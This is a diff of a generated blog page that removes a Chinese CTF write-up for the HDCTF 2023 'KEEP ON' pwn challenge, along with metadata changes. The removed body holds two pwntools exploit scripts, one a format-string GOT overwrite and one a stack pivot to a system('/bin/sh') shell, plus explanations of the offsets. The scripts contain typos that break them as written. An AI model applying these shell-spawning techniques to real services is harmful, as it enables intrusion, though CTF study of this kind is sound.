@@ -20,24 +20,16 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"li1x.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":true,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="知识点：格式化字符串劫持、栈迁移  法1,格式化字符串劫持(将printf_got 改成 system_plt) 123456789101112131415161718192021222324252627282930313233343536373839#   -&gt; 通过调用printf函数来调用system函数的地址，而这个程序中我们写入的内容保存在s中 然后会作为printf的参数，从而得">
-<meta property="og:type" content="article">
+    <meta property="og:type" content="article">
 <meta property="og:title" content="BUU-[HDCTF 2023]KEEP ON的Wp">
 <meta property="og:url" content="https://li1x.github.io/CTF/Pwn/hdctf%E7%9A%84wp/index.html">
 <meta property="og:site_name" content="Li1x&#39;s Blog">
-<meta property="og:description" content="知识点：格式化字符串劫持、栈迁移  法1,格式化字符串劫持(将printf_got 改成 system_plt) 123456789101112131415161718192021222324252627282930313233343536373839#   -&gt; 通过调用printf函数来调用system函数的地址，而这个程序中我们写入的内容保存在s中 然后会作为printf的参数，从而得">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://li1x.github.io/CTF/Pwn/hdctf%E7%9A%84wp/05.png">
-<meta property="og:image" content="https://li1x.github.io/CTF/Pwn/hdctf%E7%9A%84wp/01.png">
-<meta property="og:image" content="https://li1x.github.io/CTF/Pwn/hdctf%E7%9A%84wp/02.png">
-<meta property="og:image" content="https://li1x.github.io/CTF/Pwn/hdctf%E7%9A%84wp/03.png">
-<meta property="og:image" content="https://li1x.github.io/CTF/Pwn/hdctf%E7%9A%84wp/04.png">
 <meta property="article:published_time" content="2024-02-06T17:37:13.545Z">
-<meta property="article:modified_time" content="2024-03-10T16:28:43.866Z">
+<meta property="article:modified_time" content="2024-03-25T17:59:35.166Z">
 <meta property="article:author" content="Li1x">
 <meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://li1x.github.io/CTF/Pwn/hdctf%E7%9A%84wp/05.png">
 
 
 <link rel="canonical" href="https://li1x.github.io/CTF/Pwn/hdctf%E7%9A%84wp/">
@@ -161,7 +153,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives">
-          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-count">14</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -172,7 +164,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags">
-        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -235,7 +227,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2024-03-11 00:28:43" itemprop="dateModified" datetime="2024-03-11T00:28:43+08:00">2024-03-11</time>
+      <time title="Modified: 2024-03-26 01:59:35" itemprop="dateModified" datetime="2024-03-26T01:59:35+08:00">2024-03-26</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -275,14 +267,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">Word count in article: </span>
-      <span>2.1k</span>
+      <span>0</span>
     </span>
     <span class="post-meta-item" title="Reading time">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>4 mins.</span>
+      <span>1 mins.</span>
     </span>
 </div>
 
@@ -292,30 +284,7 @@
     
     
     
-    <div class="post-body" itemprop="articleBody"><p><strong>知识点：格式化字符串劫持、<a target="_blank" rel="noopener" href="https://www.cnblogs.com/max1z/p/15299000.html">栈迁移</a></strong></p>
-<p><img src="/CTF/Pwn/hdctf%E7%9A%84wp/05.png"></p>
-<p><strong>法1,格式化字符串劫持(将printf_got 改成 system_plt)</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#   -&gt; 通过调用printf函数来调用system函数的地址，而这个程序中我们写入的内容保存在s中 然后会作为printf的参数，从而得到shell</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context(log_level=&quot;debug&quot;,arch=&quot;i386&quot;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28014</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./../pwn&quot;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./hdctf&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]  <span class="comment"># 寻找got表中printf的地址</span></span><br><span class="line"></span><br><span class="line">system_glt = elf.glt[<span class="string">&#x27;system&#x27;</span>]  <span class="comment"># 寻找plt表中system的地址</span></span><br><span class="line"></span><br><span class="line">payload1 = fmtstr_payload(<span class="number">6</span>, &#123;printf_got:system_plt&#125;)  <span class="comment"># fmtstr_payload:got表劫持函数, 6是对应格式化字符串位置的索引，后面将printf的地址改成system的</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name: \n&#x27;</span>)   <span class="comment"># \n 是换行的意思.</span></span><br><span class="line"></span><br><span class="line">p.send(payload1)	<span class="comment"># 这里发送是为了将printf_got 改成 system_plt =&gt; 以后调用printf函数就相当于调用system</span></span><br><span class="line"></span><br><span class="line">vulnaddr = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload2 = cyclic(<span class="number">0x50</span> + <span class="number">0x08</span>) + p64(vuln_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;keep on !\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload2)   <span class="comment"># 这里必须用send --&gt; 因为这里的read写入0x60(溢出16字节)0x08和vuln的地址就是16字节了,sendline后面跟有换行符</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name: \n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>寻找偏移量 找 616161在第几位 </p>
-<p>​	-&gt; 我们输入的是aaaa 0x61(十六进制 -&gt; ascii的97)即a</p>
-</blockquote>
-<p><img src="/CTF/Pwn/hdctf%E7%9A%84wp/01.png"></p>
-<p><strong>法2,栈迁移,可以先阅读前面的那个文章</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ROPgadget --binary hdctf --only &quot;pop|ret&quot;  0x00000000004008d3 : pop rdi ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ROPgadget --binary hdctf | grep leave   0x00000000004007f2 : leave ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28296</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./hdctf&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;name: \n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;%16$p&#x27;</span>)  <span class="comment"># 获得 old_rbp</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;hello,0x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">old_rbp = <span class="built_in">int</span>(io.recvunitl(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target_addr = old_rbp - <span class="number">0x60</span> - <span class="number">0x08</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x4008d3</span></span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x4007f2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(pop_rdi_ret) + p64(target_addr + <span class="number">0x20</span>) + p64(elf.sym[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(target_addr) + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;keep on !&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>Q&amp;A（个人理解）</p>
-<p><code>%16$p是哪来的</code></p>
-<p>-&gt;可以用过gdb动态调试得到old_rbp的具体值,然后通过尽量多的%p来泄露出具体位置</p>
-<p><img src="/CTF/Pwn/hdctf%E7%9A%84wp/02.png"></p>
-<p><code>0x60是哪里来的?</code></p>
-<p>-&gt;子函数中栈底指向了父函数的栈底的地址, 0x7fffffffe1e0就是old_rbp - 0x7fffffffe180&#x3D;0x60</p>
-<p><img src="/CTF/Pwn/hdctf%E7%9A%84wp/03.png"></p>
-<p><code>payload中为什么要加0x20 ?</code></p>
-<p>-&gt; 0x20 &#x3D; 32 &#x3D;&gt; 4个8字节, 指向了&#x2F;bin&#x2F;sh所在的位置</p>
-<p><img src="/CTF/Pwn/hdctf%E7%9A%84wp/04.png"></p>
-
+    <div class="post-body" itemprop="articleBody">
     </div>
 
     
@@ -374,13 +343,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="Word count total">28k</span>
+    <span title="Word count total">40k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">52 mins.</span>
+    <span title="Reading time total">1:13</span>
   </span>
 </div>
 <div class="busuanzi-count">
